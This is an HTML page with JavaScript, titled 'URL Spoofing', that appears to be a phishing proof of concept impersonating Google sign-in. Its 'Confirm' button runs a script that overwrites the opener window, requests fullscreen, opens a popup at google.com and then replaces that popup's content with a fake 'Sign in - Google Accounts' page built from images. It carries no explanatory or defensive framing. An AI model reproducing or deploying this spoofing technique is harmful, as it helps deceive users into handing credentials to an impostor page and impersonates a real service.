<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, user-scalable=no" />
    <title>URL Spoofing</title>

    <style>
      #button {
        width: 150px;
        height: 35px;
      }
    </style>

    <script>
      function spoof() {
        const openerHTML = `
        <html>
            <head>
                <style>
                    body {
                        margin: 0;
                        padding: 0;
                        overflow: hidden;
                    }
                    #content {
                        width: 100%;
                        height: 100%;
                        display: block;
                    }
                </style>
            </head>
            <body>
                <img id="content" src="spoof.png">
            </body>
        </html>
    `;

        const popupHTML = `
        <html>
            <head>
                <title>Sign in - Google Accounts</title>
                <style>
                    body {
                        margin: 0;
                        padding: 0;
                        overflow: hidden;
                    }
                    #content {
                        width: 100%;
                        height: 100%;
                        display: block;
                    }
                </style>
            </head>
            <body>
                <img id="content" src="sign.png">
            </body>
        </html>
    `;

        // ---- FULLSCREEN FALLBACK ----
        if (
          window.opener &&
          window.opener.document.documentElement.requestFullscreen
        ) {
          window.opener.document.documentElement
            .requestFullscreen()
            .catch(() => {});
        }

        // ---- SPOOF MAIN WINDOW ----
        if (window.opener) {
          window.opener.document.open();
          window.opener.document.write(openerHTML);
          window.opener.document.close();
        }

        // ---- OPEN POPUP ----
        const width = 500,
          height = 460;
        const left = screen.width / 2 - width / 2;

        const win = window.open(
          "https://www.google.com/",
          "_blank",
          "second",
          `width=${width},height=${height},top=0,left=${left}`
        );

        setTimeout(() => {
          try {
            win.document.write(popupHTML);
            win.document.close();
          } catch (e) {
            console.warn("Blocked by browser protections:", e);
          }
        }, 50);

        // ---- CLOSE CURRENT WINDOW ----
        window.close();
      }
    </script>
  </head>

  <body>
    <center>
      <br />
      <h1>
        Please confirm you want to sign in into your Google Account<br /><br />
        <button id="button" onclick="spoof();">Confirm</button>
      </h1>
    </center>
  </body>
</html>
